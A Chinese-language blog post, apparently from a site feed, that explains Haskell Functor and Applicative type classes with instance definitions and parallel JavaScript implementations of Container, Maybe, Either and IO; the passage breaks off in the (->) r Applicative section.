    <content type="html"><![CDATA[<p>从Functors到Monad，理解Functor,Applicative,Monoids,Monad。文章理解或有偏差，仅作为自己总结用。</p><a id="more"></a><p>文章参照《Learn you a Haskell》和《mostly　adequate　guide》</p><h2 id="Functor-typeclass"><a href="#Functor-typeclass" class="headerlink" title="Functor typeclass"></a>Functor typeclass</h2><p>先来看看haskell中其type class定义:<br><figure class="highlight haskell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="type">Functor</span> (<span class="title">f</span> :: * -&gt; *) <span class="keyword">where</span></span></span><br><span class="line">  fmap :: (a -&gt; b) -&gt; f a -&gt; f b</span><br><span class="line">  (&lt;$) :: a -&gt; f b -&gt; f a</span><br></pre></td></tr></table></figure></p><p>从f的kind我们可以看到，其不是一个具体类型，而是一个接受具体类型来构造具体类型的类型构造子（参照我的另一篇文章”Haskell类型系统”）。</p><p>在js中的实现：<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> Container = <span class="function"><span class="keyword">function</span>(<span class="params">x</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">this</span>.__value = x;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">Container.of = <span class="function"><span class="keyword">function</span>(<span class="params">x</span>) </span>&#123; <span class="keyword">return</span> <span class="keyword">new</span> Container(x); &#125;;</span><br><span class="line"></span><br><span class="line">Container.prototype.fmap = <span class="function"><span class="keyword">function</span>(<span class="params">f</span>)</span>&#123;</span><br><span class="line">  <span class="keyword">return</span> Container.of(f(<span class="keyword">this</span>.__value))</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>这里暂时可以简单地把Functor理解为容器，将函数运用到容器内的值上面，再将处理结果用容器进行包装。</p><h3 id="List-Functor"><a href="#List-Functor" class="headerlink" title="List Functor"></a>List Functor</h3><p>以<code>[]</code>为例，看看<code>[]</code>的<code>Functor instance</code>实现:<br><figure class="highlight haskell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">instance</span> <span class="type">Functor</span> [] <span class="keyword">where</span></span></span><br><span class="line">    <span class="meta">&#123;-# INLINE fmap #-&#125;</span></span><br><span class="line">    fmap = map</span><br></pre></td></tr></table></figure></p><p>可以看到<code>fmap</code>直接就是<code>map</code>，这个不难理解：<code>map :: (a -&gt; b) -&gt; [a] -&gt; [b]</code>。</p><h3 id="Maybe-Functor"><a href="#Maybe-Functor" class="headerlink" title="Maybe Functor"></a>Maybe Functor</h3><figure class="highlight haskell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">instance</span>  <span class="type">Functor</span> <span class="type">Maybe</span>  <span class="keyword">where</span></span></span><br><span class="line">    fmap _ <span class="type">Nothing</span>       = <span class="type">Nothing</span></span><br><span class="line">    fmap f (<span class="type">Just</span> a)      = <span class="type">Just</span> (f a)</span><br></pre></td></tr></table></figure><p>总之接受一个通过类型构造子包装的具体类型数据，最终返回的也要是经过它封装的具体类型数据。</p><p>js中实现:<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> Maybe = <span class="function"><span class="keyword">function</span>(<span class="params">x</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">this</span>.__value = x;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">Maybe.of = <span class="function"><span class="keyword">function</span>(<span class="params">x</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="keyword">new</span> Maybe(x);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">Maybe.prototype.isNothing = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> (<span class="keyword">this</span>.__value === <span class="literal">null</span> || <span class="keyword">this</span>.__value === <span class="literal">undefined</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">Maybe.prototype.fmap = <span class="function"><span class="keyword">function</span>(<span class="params">f</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="keyword">this</span>.isNothing() ? Maybe.of(<span class="literal">null</span>) : Maybe.of(f(<span class="keyword">this</span>.__value));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>一个例子:<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> showWelcome = _.compose(_.concat( <span class="string">"Welcome "</span>), _.prop(<span class="string">'name'</span>))</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> checkActive = <span class="function"><span class="keyword">function</span>(<span class="params">user</span>) </span>&#123;</span><br><span class="line"> <span class="keyword">return</span> user.active ? Right.of(user) : Left.of(<span class="string">'Your account is not active'</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> ex6 = _.compose(fmap(showWelcome),checkActive)</span><br><span class="line"></span><br><span class="line"><span class="built_in">console</span>.log(ex6(&#123;<span class="attr">active</span>:<span class="literal">false</span>,<span class="attr">name</span>:<span class="string">"luoxia"</span>&#125;)) <span class="comment">// Left &#123;__value: 'Your account is not active'&#125;</span></span><br></pre></td></tr></table></figure></p><h3 id="Either-Functor"><a href="#Either-Functor" class="headerlink" title="Either Functor"></a>Either Functor</h3><p>Either可以用于纯的错误处理，这里的纯可以对比一般的<code>try/catch</code>。</p><p>haskell中关于Either的Functor instance:<br><figure class="highlight haskell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">instance</span> <span class="type">Functor</span> (<span class="type">Either</span> <span class="title">a</span>) <span class="keyword">where</span></span></span><br><span class="line">    fmap f (<span class="type">Right</span> x) = <span class="type">Right</span> (f x)</span><br><span class="line">    fmap f (<span class="type">Left</span> x) = <span class="type">Left</span> x</span><br></pre></td></tr></table></figure></p><p>可以看到，Left构造子构造的类型数据可以充当报告错误信息的功能:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Prelude&gt; fmap (\s -&gt; &quot;the result: &quot; ++ s) $ Left &quot;error:overflow&quot;</span><br><span class="line">Left &quot;error:overflow&quot;</span><br><span class="line">Prelude&gt; fmap (\s -&gt; &quot;the result: &quot; ++ show s) $ Right 66</span><br><span class="line">Right &quot;the result: 66&quot;</span><br></pre></td></tr></table></figure></p><p>来看看js中的例子:<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> moment = <span class="built_in">require</span>(<span class="string">'moment'</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//  getAge :: Date -&gt; User -&gt; Either(String, Number)</span></span><br><span class="line"><span class="keyword">var</span> getAge = curry(<span class="function"><span class="keyword">function</span>(<span class="params">now, user</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">var</span> birthdate = moment(user.birthdate, <span class="string">'YYYY-MM-DD'</span>);</span><br><span class="line">  <span class="keyword">if</span>(!birthdate.isValid()) <span class="keyword">return</span> Left.of(<span class="string">"Birth date could not be parsed"</span>);</span><br><span class="line">  <span class="keyword">return</span> Right.of(now.diff(birthdate, <span class="string">'years'</span>));</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">getAge(moment(), &#123;<span class="attr">birthdate</span>: <span class="string">'2005-12-12'</span>&#125;);</span><br><span class="line"><span class="comment">// Right(9)</span></span><br><span class="line"></span><br><span class="line">getAge(moment(), &#123;<span class="attr">birthdate</span>: <span class="string">'balloons!'</span>&#125;);</span><br><span class="line"><span class="comment">// Left("Birth date could not be parsed")</span></span><br></pre></td></tr></table></figure></p><h3 id="IO-Functor"><a href="#IO-Functor" class="headerlink" title="IO Functor"></a>IO Functor</h3><p>I/O同样也是<code>functor</code>：<br><figure class="highlight haskell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">instance</span>  <span class="type">Functor</span> <span class="type">IO</span> <span class="keyword">where</span></span></span><br><span class="line">   fmap f x = x &gt;&gt;= (pure . f)</span><br></pre></td></tr></table></figure></p><p>这里还得联系<code>Applicative Functor</code>和<code>Monad</code>:<br><figure class="highlight haskell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">instance</span> <span class="type">Applicative</span> <span class="type">IO</span> <span class="keyword">where</span></span></span><br><span class="line">    pure  = returnIO</span><br><span class="line">    (*&gt;)  = thenIO</span><br><span class="line">    (&lt;*&gt;) = ap</span><br><span class="line">    liftA2 = liftM2</span><br><span class="line"></span><br><span class="line"><span class="comment">-- | @since 2.01</span></span><br><span class="line"><span class="class"><span class="keyword">instance</span>  <span class="type">Monad</span> <span class="type">IO</span>  <span class="keyword">where</span></span></span><br><span class="line">    (&gt;&gt;)      = (*&gt;)</span><br><span class="line">    (&gt;&gt;=)     = bindIO</span><br><span class="line">    fail s    = failIO s</span><br><span class="line"></span><br><span class="line"><span class="title">returnIO</span> :: a -&gt; <span class="type">IO</span> a</span><br><span class="line"><span class="title">bindIO</span> :: <span class="type">IO</span> a -&gt; (a -&gt; <span class="type">IO</span> b) -&gt; <span class="type">IO</span> b</span><br></pre></td></tr></table></figure></p><p>而这里的<code>pure</code>实际上是对某常规值进行一个<code>IO</code>包装，例如<br><figure class="highlight haskell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title">fmap</span> (\() -&gt; <span class="string">"hello  world"</span>) (putStrLn <span class="string">"hello"</span>) :: <span class="type">IO</span> [<span class="type">Char</span>]</span><br></pre></td></tr></table></figure></p><p><code>putStrLn &quot;hello&quot;</code>返回值为<code>IO ()</code>，经过fmap的f参数一处理返回<code>[Char]</code>，再经过<code>pure</code>函数包装。</p><p>其与下面这种异曲同工:<br><figure class="highlight haskell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">instance</span> <span class="type">Functor</span> <span class="type">IO</span> <span class="keyword">where</span></span></span><br><span class="line">    fmap f action = <span class="keyword">do</span></span><br><span class="line">        result &lt;- action</span><br><span class="line">        return (f result)</span><br></pre></td></tr></table></figure></p><p>我们再来看看js中实现:<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> IO = <span class="function"><span class="keyword">function</span>(<span class="params">f</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">this</span>.__value = f;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">IO.of = <span class="function"><span class="keyword">function</span>(<span class="params">x</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="keyword">new</span> IO(<span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> x;</span><br><span class="line">  &#125;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">IO.prototype.fmap = <span class="function"><span class="keyword">function</span>(<span class="params">f</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="keyword">new</span> IO(_.compose(f, <span class="keyword">this</span>.__value));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>我们可以看到IO context中的值是一个函数，而这个函数可以对一些非纯的操作进行包装延迟执行，从而使得程序看起来还是纯的。</p><p>举个例子:<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//  io_window_ :: IO Window</span></span><br><span class="line"><span class="keyword">var</span> io_window = <span class="keyword">new</span> IO(<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123; <span class="keyword">return</span> <span class="built_in">window</span>; &#125;);</span><br><span class="line"></span><br><span class="line">io_window.fmap(<span class="function"><span class="keyword">function</span>(<span class="params">win</span>)</span>&#123; <span class="keyword">return</span> win.innerWidth &#125;);</span><br><span class="line"><span class="comment">// IO(1430)</span></span><br><span class="line"></span><br><span class="line">io_window.fmap(_.prop(<span class="string">'location'</span>)).fmap(_.prop(<span class="string">'href'</span>)).fmap(_.split(<span class="string">'/'</span>));</span><br><span class="line"><span class="comment">// IO(["http:", "", "localhost:8000", "blog", "posts"])</span></span><br></pre></td></tr></table></figure></p><p>上面的结果注释实际上是概念性的，实际上的返回值是诸如:<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">IO &#123;</span><br><span class="line">    __value: _.compose(_.split(<span class="string">'/'</span>),_.prop(<span class="string">'href'</span>),_.prop(<span class="string">'location'</span>),<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123; <span class="keyword">return</span> <span class="built_in">window</span>; &#125;)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>每一次调用<code>fmap</code>实际上是把新的function加入到function compose队列最后。这样我们把一系列的不纯的操作包裹在了这样一个IO Functor context里。</p><p>就如同haskell中的做法一样，我们在集中的一个地方去释放这些不纯的操作：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">////// 非纯调用代码: main.js ///////</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 调用 __value() 来运行它！</span></span><br><span class="line">IO.of(impureOperation.__value());</span><br></pre></td></tr></table></figure><p>haskell也是将不纯操作放到<code>main do</code>块里，在<code>runhaskell</code>时，就释放里面的不纯操作并执行:<br><figure class="highlight haskell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="title">main</span> = <span class="keyword">do</span> line &lt;- fmap (intersperse '-' . reverse . map toUpper) getLine  </span><br><span class="line">          putStrLn line</span><br></pre></td></tr></table></figure></p><h3 id="gt-r-Functor"><a href="#gt-r-Functor" class="headerlink" title="(-&gt;) r Functor"></a>(-&gt;) r Functor</h3><p>刚刚在IO Functor的js实现中我们谈到了function composition,这可以联想到函数本身也是一个在<code>(-&gt;) r</code> functor context下的值，其fmap实现就等同于function composition。</p><p>看看instance定义:<br><figure class="highlight haskell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">instance</span> <span class="type">Functor</span> ((-&gt;) r) <span class="keyword">where</span></span></span><br><span class="line">    fmap = (.)</span><br></pre></td></tr></table></figure></p><p>而<code>(.) :: (b -&gt; c) -&gt; (a -&gt; b) -&gt; a -&gt; c</code>，而根据<code>fmap</code>定义:<code>fmap :: Functor f =&gt; (a -&gt; b) -&gt; f a -&gt; f b</code>，用<code>(-&gt;) r</code>替换f，得到:<code>fmap :: (a -&gt; b) -&gt; (r -&gt; a) -&gt; (r -&gt; b)</code>恰好符合<code>.</code>的定义。即一个function composition。</p><figure class="highlight haskell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="title">ghci</span> &gt; fmap (show . (*<span class="number">3</span>)) (*<span class="number">100</span>) <span class="number">2</span></span><br><span class="line"><span class="number">600</span></span><br></pre></td></tr></table></figure><h3 id="Functor-laws"><a href="#Functor-laws" class="headerlink" title="Functor laws"></a>Functor laws</h3><ol><li><p><code>fmap id = id</code>即用id去map over functor会返回跟原functor一样的functor。</p></li><li><p><code>fmap (f . g) = fmap f . fmap g</code></p></li></ol><p>或者js实现表示：<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// identity</span></span><br><span class="line">map(id) === id;</span><br><span class="line"></span><br><span class="line"><span class="comment">// composition</span></span><br><span class="line">compose(map(f), map(g)) === map(compose(f, g));</span><br></pre></td></tr></table></figure></p><h2 id="Applicative-Functor-type-class"><a href="#Applicative-Functor-type-class" class="headerlink" title="Applicative Functor type class"></a>Applicative Functor type class</h2><p>之前讲到的Functor，我们只能对functor运用一个单参数函数。但是如果我们要将一个接受多个参数的函数运用到functor呢？这就要提到Applicative Functor,它可以让一个接受多个参数的函数运用到多个Functor上。</p><p>首先是其定义:<br><figure class="highlight haskell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="type">Functor</span> f =&gt; <span class="type">Applicative</span> (<span class="title">f</span> :: * -&gt; *) <span class="keyword">where</span></span></span><br><span class="line">  pure :: a -&gt; f a</span><br><span class="line">  (&lt;*&gt;) :: f (a -&gt; b) -&gt; f a -&gt; f b</span><br><span class="line">  (*&gt;) :: f a -&gt; f b -&gt; f b</span><br><span class="line">  (&lt;*) :: f a -&gt; f b -&gt; f a</span><br></pre></td></tr></table></figure></p><p>来看看一个js关于<code>&lt;*&gt;</code>的实现：<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Container.prototype.ap = <span class="function"><span class="keyword">function</span>(<span class="params">other_container</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> other_container.fmap(<span class="keyword">this</span>.__value);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><h3 id="Maybe-Applicative"><a href="#Maybe-Applicative" class="headerlink" title="Maybe Applicative"></a>Maybe Applicative</h3><figure class="highlight haskell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">instance</span> <span class="type">Applicative</span> <span class="type">Maybe</span> <span class="keyword">where</span></span></span><br><span class="line">    pure = <span class="type">Just</span></span><br><span class="line"></span><br><span class="line">    <span class="type">Just</span> f  &lt;*&gt; m       = fmap f m</span><br><span class="line">    <span class="type">Nothing</span> &lt;*&gt; _m      = <span class="type">Nothing</span></span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">ghci&gt; pure (+) &lt;*&gt; Just 3 &lt;*&gt; Just 5  </span><br><span class="line">Just 8  </span><br><span class="line">ghci&gt; pure (+) &lt;*&gt; Just 3 &lt;*&gt; Nothing  </span><br><span class="line">Nothing  </span><br><span class="line">ghci&gt; pure (+) &lt;*&gt; Nothing &lt;*&gt; Just 5  </span><br><span class="line">Nothing</span><br></pre></td></tr></table></figure><p>这让我们能够以一种从左到右的方式去应用函数到多个Functors:<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Maybe.of(_.add).ap(Maybe.of(<span class="number">2</span>)).ap(Maybe.of(<span class="number">3</span>));</span><br></pre></td></tr></table></figure></p><p>而<code>pure (+) &lt;*&gt; Just 3</code>这种完全可以用<code>fmap (+) Just 3</code>代替，有一个<code>&lt;$&gt;</code>就是做这个的:<br><figure class="highlight haskell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">(&lt;$&gt;) :: (<span class="type">Functor</span> f) =&gt; (a -&gt; b) -&gt; f a -&gt; f b  </span><br><span class="line"><span class="title">f</span> &lt;$&gt; x = fmap f x</span><br></pre></td></tr></table></figure></p><p>这样就可以这样写:<code>(++) &lt;$&gt; Just &quot;johntra&quot; &lt;*&gt; Just &quot;volta&quot;</code>就可以直接将一个普通函数用到applicative functor上了。</p><p>从js角度来看：<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">F.of(x).fmap(f) == F.of(f).ap(F.of(x))</span><br></pre></td></tr></table></figure></p><p>那么上面的例子同意可以转换为：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Maybe.of(2).fmap(_.add).ap(Maybe.of(3));</span><br></pre></td></tr></table></figure></p><h3 id="List-Applicative"><a href="#List-Applicative" class="headerlink" title="List Applicative"></a>List Applicative</h3><figure class="highlight haskell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">instance</span> <span class="type">Applicative</span> [] <span class="keyword">where</span></span></span><br><span class="line">    pure x    = [x]</span><br><span class="line">    fs &lt;*&gt; xs = [f x | f &lt;- fs, x &lt;- xs]</span><br></pre></td></tr></table></figure><p>可以看到<code>&lt;*&gt;</code>是将左右两个<code>[]</code>进行任意组合，左边的包含了多个函数，右边包含了多个原始值。<br><figure class="highlight haskell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="title">ghci</span>&gt; (++) &lt;$&gt; [<span class="string">"ha"</span>,<span class="string">"heh"</span>,<span class="string">"hmm"</span>] &lt;*&gt; [<span class="string">"?"</span>,<span class="string">"!"</span>,<span class="string">"."</span>]  </span><br><span class="line">[<span class="string">"ha?"</span>,<span class="string">"ha!"</span>,<span class="string">"ha."</span>,<span class="string">"heh?"</span>,<span class="string">"heh!"</span>,<span class="string">"heh."</span>,<span class="string">"hmm?"</span>,<span class="string">"hmm!"</span>,<span class="string">"hmm."</span>]</span><br></pre></td></tr></table></figure></p><p>来看看ramdajs关于List的<code>ap</code>实现：<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">R.ap([R.multiply(<span class="number">2</span>), R.add(<span class="number">3</span>)], [<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>]); <span class="comment">//=&gt; [2, 4, 6, 4, 5, 6]</span></span><br></pre></td></tr></table></figure></p><p>显然它们是异曲同工。</p><h3 id="IO-Applicative"><a href="#IO-Applicative" class="headerlink" title="IO Applicative"></a>IO Applicative</h3><p>首先是定义:<br><figure class="highlight haskell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">instance</span> <span class="type">Applicative</span> <span class="type">IO</span> <span class="keyword">where</span></span></span><br><span class="line">    pure  = returnIO</span><br><span class="line">    (&lt;*&gt;) = ap</span><br><span class="line"><span class="title">ap</span>                :: (<span class="type">Monad</span> m) =&gt; m (a -&gt; b) -&gt; m a -&gt; m b</span><br><span class="line"><span class="title">ap</span> m1 m2          = <span class="keyword">do</span> &#123; x1 &lt;- m1; x2 &lt;- m2; return (x1 x2) &#125;</span><br></pre></td></tr></table></figure></p><p>终于看到了<code>ap</code>，也就是<code>&lt;*&gt;</code>的别名。换种写法:<br><figure class="highlight haskell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">instance</span> <span class="type">Applicative</span> <span class="type">IO</span> <span class="keyword">where</span></span>  </span><br><span class="line">    pure = return  </span><br><span class="line">    a &lt;*&gt; b = <span class="keyword">do</span>  </span><br><span class="line">        f &lt;- a  </span><br><span class="line">        x &lt;- b  </span><br><span class="line">        return (f x)</span><br></pre></td></tr></table></figure></p><p>即<code>(&lt;*&gt;) :: IO (a -&gt; b) -&gt; IO a -&gt; IO b</code>。</p><p>以<code>(++) &lt;$&gt; getLine &lt;*&gt; getLine</code>为例，<code>getLine :: IO String</code>，<code>fmap (++) getLine</code>结果就是<code>fmap (++) getLine :: IO ([Char] -&gt; [Char])</code>，即从第一个<code>getLine</code>里取出结果<code>str1</code>，map over<code>(++)</code>得到<code>IO (++str1)</code>，来到<code>&lt;*&gt;</code>，将<code>(++str1)</code>取出应用到第二个参数的IO上，最后通过<code>return</code>封装成<code>IO ([Char])</code>。</p><p>来看一个js中的例子：<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 帮助函数：</span></span><br><span class="line"><span class="comment">// ==============</span></span><br><span class="line"><span class="comment">//  $ :: String -&gt; IO DOM</span></span><br><span class="line"><span class="keyword">var</span> $ = <span class="function"><span class="keyword">function</span>(<span class="params">selector</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="keyword">new</span> IO(<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123; <span class="keyword">return</span> <span class="built_in">document</span>.querySelector(selector) &#125;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//  getVal :: String -&gt; IO String</span></span><br><span class="line"><span class="keyword">var</span> getVal = _.compose(map(_.prop(<span class="string">'value'</span>)), $);</span><br><span class="line"></span><br><span class="line"><span class="comment">// Example:</span></span><br><span class="line"><span class="comment">// ===============</span></span><br><span class="line"><span class="comment">//  signIn :: String -&gt; String -&gt; Bool -&gt; User</span></span><br><span class="line"><span class="keyword">var</span> signIn = _.curry(<span class="function"><span class="keyword">function</span>(<span class="params">username, password, remember_me</span>)</span>&#123; <span class="comment">/* signing in */</span>  &#125;)</span><br><span class="line"></span><br><span class="line">IO.of(signIn).ap(getVal(<span class="string">'#email'</span>)).ap(getVal(<span class="string">'#password'</span>)).ap(IO.of(<span class="literal">false</span>));</span><br><span class="line"><span class="comment">// IO(&#123;id: 3, email: "gg@allin.com"&#125;)</span></span><br></pre></td></tr></table></figure></p><p>按照上一节关于IO fmap实现，实际最后的返回结果：<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">IO &#123;</span><br><span class="line">    unsafePerformIO: _.compose(<span class="function"><span class="params">remember_me</span>=&gt;</span>&#123;&#125;,()=&gt;<span class="literal">false</span>)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><h3 id="gt-r-Applicative"><a href="#gt-r-Applicative" class="headerlink" title="(-&gt;) r　Applicative"></a>(-&gt;) r　Applicative</h3><figure class="highlight haskell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">instance</span> <span class="type">Applicative</span> ((-&gt;) a) <span class="keyword">where</span></span></span><br><span class="line">    pure = const</span><br><span class="line">    (&lt;*&gt;) f g x = f x (g x)　<span class="comment">-- f &lt;*&gt; g = \x -&gt; f x (g x)</span></span><br></pre></td></tr></table></figure><p><code>(+) &lt;$&gt; (+3) &lt;*&gt; (*100) $ 5</code>结果为<code>508</code>，<code>(+) &lt;$&gt; 